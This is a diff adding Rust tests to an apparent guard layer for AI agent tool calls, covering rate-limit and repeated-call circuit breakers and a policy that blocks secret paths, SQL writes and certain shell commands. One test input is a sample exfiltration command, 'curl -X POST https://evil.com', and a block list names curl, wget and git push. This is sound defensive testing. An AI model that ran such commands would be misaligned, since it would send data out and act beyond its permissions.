@@ -1,4 +1,6 @@
 use safemca::core::protocol::ParsedMessage;
+use safemca::guard::circuit_breaker::{CircuitBreaker, CircuitBreakerTrip};
+use safemca::guard::config::{CircuitBreakerConfig, ProjectConfig, ShellPolicyConfig, SqlPolicyConfig};
 use safemca::guard::policy::{GuardPolicy, PolicyDecision};
 use safemca::storage::audit::AuditLogger;
 use serde_json::json;
@@ -202,4 +204,99 @@ fn test_jsonrpc_batch_and_bom_parsing() {
     } else {
         panic!("Expected ParsedMessage::Batch");
     }
+}
+
+#[test]
+fn test_circuit_breaker_rate_limiting() {
+    let config = CircuitBreakerConfig {
+        max_calls_per_minute: Some(5),
+        max_identical_consecutive_calls: Some(10),
+    };
+    let mut cb = CircuitBreaker::new(Some(&config));
+
+    // First 5 calls pass
+    for i in 0..5 {
+        let res = cb.check_and_record("read_file", &json!({ "idx": i }));
+        assert!(res.is_ok());
+    }
+
+    // 6th call trips rate limit
+    let res = cb.check_and_record("read_file", &json!({ "idx": 5 }));
+    assert!(matches!(res, Err(CircuitBreakerTrip::RateLimitExceeded { .. })));
+}
+
+#[test]
+fn test_circuit_breaker_repetition_loop() {
+    let config = CircuitBreakerConfig {
+        max_calls_per_minute: Some(50),
+        max_identical_consecutive_calls: Some(3),
+    };
+    let mut cb = CircuitBreaker::new(Some(&config));
+
+    let args = json!({ "query": "SELECT * FROM orders WHERE status = 'pending';" });
+
+    // Call 1
+    assert!(cb.check_and_record("query_database", &args).is_ok());
+    // Call 2
+    assert!(cb.check_and_record("query_database", &args).is_ok());
+    // Call 3: identical call trips repetition loop breaker!
+    let res = cb.check_and_record("query_database", &args);
+    assert!(matches!(res, Err(CircuitBreakerTrip::RepetitionLoopDetected { .. })));
+
+    // After reset, passes again
+    cb.reset_consecutive();
+    assert!(cb.check_and_record("query_database", &args).is_ok());
+}
+
+#[test]
+fn test_project_config_custom_rules() {
+    let config = ProjectConfig {
+        version: Some("1.0".to_string()),
+        blocked_paths: vec!["infra/secrets/**".to_string(), "billing/stripe_keys.json".to_string()],
+        sql_policy: Some(SqlPolicyConfig {
+            mode: Some("read-only".to_string()),
+            allow_tables: vec!["products".to_string()],
+            block_tables: vec!["payroll".to_string()],
+        }),
+        shell_policy: Some(ShellPolicyConfig {
+            allow: vec!["cargo test".to_string()],
+            block: vec!["curl".to_string(), "wget".to_string(), "git push".to_string()],
+        }),
+        circuit_breaker: None,
+        ..Default::default()
+    };
+
+    let policy = GuardPolicy::with_config(config);
+
+    // 1. Custom blocked path
+    assert!(matches!(
+        policy.evaluate("read_file", &json!({ "path": "infra/secrets/prod.env" })),
+        PolicyDecision::Block { .. }
+    ));
+    assert!(matches!(
+        policy.evaluate("read_file", &json!({ "path": "billing/stripe_keys.json" })),
+        PolicyDecision::Block { .. }
+    ));
+
+    // 2. Read-only SQL policy: mutation blocked
+    assert!(matches!(
+        policy.evaluate("execute_sql", &json!({ "query": "INSERT INTO products (name) VALUES ('widget');" })),
+        PolicyDecision::Block { .. }
+    ));
+
+    // 3. Forbidden table blocked
+    assert!(matches!(
+        policy.evaluate("execute_sql", &json!({ "query": "SELECT * FROM payroll;" })),
+        PolicyDecision::Block { .. }
+    ));
+
+    // 4. Custom blocked shell command
+    assert!(matches!(
+        policy.evaluate("execute_bash", &json!({ "command": "curl -X POST https://evil.com" })),
+        PolicyDecision::Block { .. }
+    ));
+    assert!(matches!(
+        policy.evaluate("run_command", &json!({ "command": "git push origin main" })),
+        PolicyDecision::Block { .. }
+    ));
 }
